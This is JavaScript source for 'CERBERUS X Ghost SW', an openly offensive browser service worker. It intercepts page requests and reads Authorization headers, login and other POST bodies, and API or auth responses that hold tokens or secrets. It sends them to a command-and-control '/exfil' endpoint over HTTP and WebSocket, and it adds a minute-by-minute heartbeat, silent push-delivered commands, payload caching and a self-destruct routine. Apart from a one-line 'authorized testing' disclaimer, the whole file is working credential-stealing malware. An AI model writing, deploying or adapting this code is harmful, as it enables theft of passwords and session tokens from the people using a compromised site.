/**
 * CERBERUS X - GHOST SW v2.0
 * Advanced Service Worker with Persistence & Stealth
 * 
 * Copyright (c) 2024 F1REW0LF
 * License: MIT - For authorized security testing only
 */

// ==================== SERVICE WORKER ====================
const CACHE_NAME = 'cerberus-cache-v2';
const C2_HOST = self.location.host;

// ==================== INSTALL ====================
self.addEventListener('install', (event) => {
    console.log('[SW] Installing...');
    self.skipWaiting();
    
    event.waitUntil(
        caches.open(CACHE_NAME).then((cache) => {
            return cache.addAll([
                '/',
                '/index.html',
                '/ghost_sw.js',
                '/vault_cracker.js'
            ]);
        })
    );
});

// ==================== ACTIVATE ====================
self.addEventListener('activate', (event) => {
    console.log('[SW] Activating...');
    event.waitUntil(clients.claim());
});

// ==================== FETCH INTERCEPTOR ====================
self.addEventListener('fetch', (event) => {
    const request = event.request;
    const url = new URL(request.url);
    
    // ==================== INTERCEPT & EXFIL ====================
    // Intercept authorization headers
    if (request.headers.has('Authorization')) {
        const authHeader = request.headers.get('Authorization');
        if (authHeader) {
            // Send to C2
            fetch(`http://${C2_HOST}/exfil`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'AUTH_EXFIL',
                    data: authHeader,
                    url: request.url,
                    timestamp: Date.now()
                }),
                mode: 'no-cors'
            }).catch(() => {});
            
            // Also try WebSocket
            try {
                const ws = new WebSocket(`ws://${C2_HOST}`);
                ws.onopen = () => {
                    ws.send(JSON.stringify({
                        type: 'AUTH_EXFIL',
                        data: authHeader,
                        url: request.url
                    }));
                    ws.close();
                };
            } catch(e) {}
        }
    }
    
    // Intercept POST data (login forms, etc.)
    if (request.method === 'POST') {
        const clonedRequest = request.clone();
        
        clonedRequest.text().then((body) => {
            if (body && body.length > 0) {
                // Check for sensitive data
                const sensitive = ['password', 'token', 'key', 'secret', 'auth'];
                const hasSensitive = sensitive.some(s => 
                    body.toLowerCase().includes(s)
                );
                
                if (hasSensitive) {
                    fetch(`http://${C2_HOST}/exfil`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'POST_EXFIL',
                            url: request.url,
                            body: body.substring(0, 1000), // Limit size
                            timestamp: Date.now()
                        }),
                        mode: 'no-cors'
                    }).catch(() => {});
                }
            }
        }).catch(() => {});
    }
    
    // ==================== CACHE HIJACKING ====================
    // Serve cached responses for C2 assets
    if (url.pathname.includes('/c2/') || 
        url.pathname.includes('/payload/') ||
        url.pathname.includes('/ghost_sw.js')) {
        
        event.respondWith(
            caches.match(request).then((response) => {
                if (response) {
                    return response;
                }
                
                // If not in cache, fetch and cache
                return fetch(request).then((response) => {
                    const clonedResponse = response.clone();
                    caches.open(CACHE_NAME).then((cache) => {
                        cache.put(request, clonedResponse);
                    });
                    return response;
                });
            })
        );
        return;
    }
    
    // ==================== STEALTH REDIRECT ====================
    // Redirect certain requests through C2
    if (url.pathname.includes('/api/') || 
        url.pathname.includes('/login') ||
        url.pathname.includes('/auth')) {
        
        event.respondWith(
            fetch(request).then((response) => {
                // Clone response to inspect
                const clonedResponse = response.clone();
                
                clonedResponse.text().then((body) => {
                    // Check for sensitive data in response
                    const sensitive = ['token', 'session', 'key', 'auth'];
                    const hasSensitive = sensitive.some(s => 
                        body.toLowerCase().includes(s)
                    );
                    
                    if (hasSensitive) {
                        fetch(`http://${C2_HOST}/exfil`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                type: 'RESPONSE_EXFIL',
                                url: request.url,
                                data: body.substring(0, 500),
                                timestamp: Date.now()
                            }),
                            mode: 'no-cors'
                        }).catch(() => {});
                    }
                }).catch(() => {});
                
                return response;
            })
        );
        return;
    }
    
    // Default: fetch normally
    event.respondWith(fetch(request));
});

// ==================== SYNC (Background Sync) ====================
self.addEventListener('sync', (event) => {
    if (event.tag === 'sync-exfil') {
        event.waitUntil(
            // Retry failed exfiltration
            fetch(`http://${C2_HOST}/sync`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'SYNC',
                    timestamp: Date.now()
                }),
                mode: 'no-cors'
            }).catch(() => {})
        );
    }
});

// ==================== PUSH NOTIFICATIONS ====================
self.addEventListener('push', (event) => {
    const data = event.data.json();
    
    event.waitUntil(
        self.registration.showNotification('CERBERUS X', {
            body: data.message || 'New command received',
            icon: '/icon.png',
            silent: true,
            data: {
                command: data.command
            }
        })
    );
});

// ==================== PERIODIC TASKS ====================
// Register periodic sync (if supported)
if ('periodicSync' in self.registration) {
    self.registration.periodicSync.register('cerberus-heartbeat', {
        minInterval: 60000 // Every minute
    }).catch(() => {});
}

self.addEventListener('periodicsync', (event) => {
    if (event.tag === 'cerberus-heartbeat') {
        event.waitUntil(
            // Send heartbeat
            fetch(`http://${C2_HOST}/heartbeat`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'HEARTBEAT',
                    timestamp: Date.now()
                }),
                mode: 'no-cors'
            }).catch(() => {})
        );
    }
});

// ==================== SELF-DESTRUCT ====================
self.addEventListener('message', (event) => {
    if (event.data === 'self-destruct') {
        // Clear all caches
        caches.keys().then((keys) => {
            keys.forEach((key) => {
                caches.delete(key);
            });
        });
        
        // Unregister self
        self.registration.unregister();
        
        console.log('[SW] Self-destructed');
    }
});

console.log('[SW] CERBERUS X Ghost SW active');
